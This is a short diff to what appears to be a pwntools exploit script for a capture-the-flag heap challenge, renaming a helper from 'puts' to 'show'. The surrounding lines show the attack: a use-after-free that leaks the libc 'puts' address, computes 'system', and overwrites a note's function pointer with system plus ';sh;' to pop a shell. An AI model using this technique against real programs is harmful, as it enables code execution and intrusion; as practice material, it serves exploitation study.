@@ -41,7 +41,7 @@ def dlt(index):
 	ru('Index :')
 	sl(str(index))
 
-def puts(index):
+def show(index):
 	ru('Your choice :')
 	sl('3')
 	ru('Index :')
@@ -55,7 +55,7 @@ dlt(0)
 dlt(1)
 
 add(8,p32(tp)+p32(pg))# 2
-puts(0)
+show(0)
 pr=u32(io.recvuntil('\xf7')[-4:])
 lsc('real puts addr: '+hex(pr))
 lb=pr-libc.sym['puts']
@@ -65,7 +65,7 @@ lsc('system addr: '+hex(sa))
 
 dlt(2)
 add(8,p32(sa)+b';sh;')
-puts(0)
+show(0)
 
 #
 io.interactive()
